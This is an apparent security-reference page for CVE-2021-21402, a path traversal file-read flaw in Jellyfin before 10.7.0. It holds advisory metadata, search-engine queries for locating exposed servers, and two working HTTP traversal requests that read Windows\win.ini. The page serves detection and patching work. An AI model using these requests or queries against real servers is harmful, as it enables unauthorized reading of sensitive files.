---
layout: post
cve_id: CVE-2021-21402
title: Jellyfin <10.7.0 - Local File Inclusion
pcap: true
pcap_path: /pcaps/2021/CVE-2021-21402.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-21402.yaml
snort2_rule: N/A
snort3_rule: N/A
author: dwisiswant0
severity: medium
impact: 'Successful exploitation could allow an attacker to read sensitive files on
  the server.

  '
remediation: This is fixed in version 10.7.1.
reference:
- https://securitylab.github.com/advisories/GHSL-2021-050-jellyfin/
- https://github.com/jellyfin/jellyfin/security/advisories/GHSA-wg4c-c9g9-rxhx
- https://github.com/jellyfin/jellyfin/releases/tag/v10.7.1
- https://github.com/jellyfin/jellyfin/commit/0183ef8e89195f420c48d2600bc0b72f6d3a7fd7
- https://nvd.nist.gov/vuln/detail/CVE-2021-21402
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 6.5
  cve-id: CVE-2021-21402
  cwe-id: CWE-22
  epss-score: 0.9275
  epss-percentile: 0.99741
  cpe: cpe:2.3:a:jellyfin:jellyfin:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 2
  vendor: jellyfin
  product: jellyfin
  shodan-query:
  - http.html:"Jellyfin"
  - http.html:"jellyfin"
  - http.title:"jellyfin"
  fofa-query:
  - title="Jellyfin" || body="http://jellyfin.media"
  - title="jellyfin"
  - body="jellyfin"
  - title="jellyfin" || body="http://jellyfin.media"
  google-query: intitle:"jellyfin"
tags:
- cve
- cve2021
- jellyfin
- lfi
- vkev
- vuln
---

## ðŸ” Vulnerability Description
Jellyfin before 10.7.0 is vulnerable to local file inclusion. This issue is more prevalent when Windows is used as the host OS. Servers exposed to public Internet are potentially at risk.


## ðŸŒ HTTP Request
```nohighlight
GET /Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /Videos/1/hls/m/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

